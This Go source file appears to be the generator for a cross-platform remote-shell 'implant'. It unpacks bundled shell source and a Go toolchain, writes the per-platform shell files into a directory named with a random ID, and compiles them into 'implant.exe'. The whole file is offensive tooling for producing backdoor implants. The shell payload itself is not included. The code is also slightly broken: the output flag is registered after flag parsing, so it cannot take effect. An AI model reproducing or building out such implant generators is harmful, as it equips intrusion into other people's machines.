package main

import (
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"

	"github.com/gobuffalo/packr"
)

var (
	supportedPlatforms = []string{"windows", "linux", "darwin"}
)

func main() {
	osPtr := flag.String("os", "", "target operating system")
	archPtr := flag.String("arch", "amd64", "target cpu architecture")
	flag.Parse()

	log.Printf("extracting assets ...")
	assetsBox := packr.NewBox("./assets")
	gshellDir := setup(assetsBox)
	defer func() {
		log.Printf("cleaning up assets in: %s", gshellDir)
		os.RemoveAll(gshellDir)
	}()
	log.Printf("extracted assets to: %s", gshellDir)

	config := GoConfig{
		GOOS:   *osPtr,
		GOARCH: *archPtr,
		GOROOT: fmt.Sprintf("%s/go", gshellDir),
	}
	generateImplant(gshellDir, config)
}

func generateImplant(gshellDir string, config GoConfig) {

	shellID := randomID(8)
	log.Printf("creating shell with ID: %s", shellID)
	assetsBox := packr.NewBox("./assets")
	shellGo, _ := assetsBox.MustString("shell/shell.go")
	shellDir := fmt.Sprintf("%s/shells/%s", gshellDir, shellID)
	err := os.MkdirAll(shellDir, os.ModePerm)
	if err != nil {
		panic(err)
	}

	log.Printf("shell dir: %s", shellDir)
	ioutil.WriteFile(fmt.Sprintf("%s/shell.go", shellDir), []byte(shellGo), 0600)
	for _, platform := range supportedPlatforms {
		shellPlatform, _ := assetsBox.MustBytes(fmt.Sprintf("shell/shell_%s.go", platform))
		ioutil.WriteFile(fmt.Sprintf("%s/shell_%s.go", shellDir, platform), shellPlatform, 0600)
	}

	cwd, _ := os.Getwd()
	outputPtr := flag.String("output", "implant.exe", "output file")
	gobuild(config, shellDir, fmt.Sprintf("%s/%s", cwd, *outputPtr))
}

func randomID(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}
